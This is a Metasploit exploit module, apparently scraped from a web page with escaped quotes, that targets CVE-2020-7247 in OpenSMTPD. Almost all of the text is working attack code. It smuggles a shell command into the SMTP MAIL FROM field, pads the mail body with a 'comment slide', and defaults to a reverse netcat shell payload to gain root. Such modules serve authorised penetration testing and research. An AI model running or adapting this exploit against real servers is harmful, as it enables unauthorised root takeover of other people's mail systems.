# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Expect

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;OpenSMTPD MAIL FROM Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a command injection in the MAIL FROM field during
        SMTP interaction with OpenSMTPD to execute code as the root user.
      },
      &#039;Author&#039;         => [
        &#039;Qualys&#039;,                               # Discovery and PoC
        &#039;wvu&#039;,                                  # Module
        &#039;RageLtMan <rageltman[at]sempervictus>&#039; # Module
      ],
      &#039;References&#039;     => [
        [&#039;CVE&#039;, &#039;2020-7247&#039;],
        [&#039;URL&#039;, &#039;https://www.openwall.com/lists/oss-security/2020/01/28/3&#039;]
      ],
      &#039;DisclosureDate&#039; => &#039;2020-01-28&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Platform&#039;       => &#039;unix&#039;,
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Privileged&#039;     => true,
      &#039;Targets&#039;        => [
        [&#039;OpenSMTPD >= commit a8e222352f&#039;,
          &#039;MyBadChars&#039; => "!\#$%&&#039;*?`{|}~\r\n".chars
        ]
      ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DefaultOptions&#039; => {&#039;PAYLOAD&#039; => &#039;cmd/unix/reverse_netcat&#039;}
    ))

    register_options([
      Opt::RPORT(25),
      OptString.new(&#039;RCPT_TO&#039;, [true, &#039;Valid mail recipient&#039;, &#039;root&#039;])
    ])

    register_advanced_options([
      OptBool.new(&#039;ForceExploit&#039;,   [false, &#039;Override check result&#039;, false]),
      OptFloat.new(&#039;ExpectTimeout&#039;, [true, &#039;Timeout for Expect&#039;, 3.5])
    ])
  end

  def check
    connect
    res = sock.get_once

    return CheckCode::Unknown unless res
    return CheckCode::Detected if res =~ /^220.*OpenSMTPD/

    CheckCode::Safe
  rescue EOFError, Rex::ConnectionError => e
    vprint_error(e.message)
    CheckCode::Unknown
  ensure
    disconnect
  end

  def exploit
    unless datastore[&#039;ForceExploit&#039;]
      unless check == CheckCode::Detected
        fail_with(Failure::Unknown, &#039;Set ForceExploit to override&#039;)
      end
    end

    # We don&#039;t care who we are, so randomize it
    me = rand_text_alphanumeric(8..42)

    # Send mail to this valid recipient
    to = datastore[&#039;RCPT_TO&#039;]

    # Comment "slide" courtesy of Qualys - brilliant!
    iter = rand_text_alphanumeric(15).chars.join(&#039; &#039;)
    from = ";for #{rand_text_alpha(1)} in #{iter};do read;done;sh;exit 0;"

    # This is just insurance, since the code was already written
    if from.length > 64
      fail_with(Failure::BadConfig, &#039;MAIL FROM field is greater than 64 chars&#039;)
    elsif (badchars = (from.chars & target[&#039;MyBadChars&#039;])).any?
      fail_with(Failure::BadConfig, "MAIL FROM field has badchars: #{badchars}")
    end

    # Create the mail body with comment slide and payload
    body = "\r\n" + "#\r\n" * 15 + payload.encoded

    sploit = {
      nil                   => /220.*OpenSMTPD/,
      "HELO #{me}"          => /250.*pleased to meet you/,
      "MAIL FROM:<#{from}>" => /250.*Ok/,
      "RCPT TO:<#{to}>"     => /250.*Recipient ok/,
      &#039;DATA&#039;                => /354 Enter mail.*itself/,
      body                  => nil,
      &#039;.&#039;                   => /250.*Message accepted for delivery/,
      &#039;QUIT&#039;                => /221.*Bye/
    }

    print_status(&#039;Connecting to OpenSMTPD&#039;)
    connect

    print_status(&#039;Saying hello and sending exploit&#039;)
    sploit.each do |line, pattern|
      send_expect(
        line,
        pattern,
        sock:    sock,
        timeout: datastore[&#039;ExpectTimeout&#039;],
        newline: "\r\n"
      )
    end
  rescue Rex::ConnectionError => e
    fail_with(Failure::Unreachable, e.message)
  rescue Timeout::Error => e
    fail_with(Failure::TimeoutExpired, e.message)
  ensure
    disconnect
  end

end

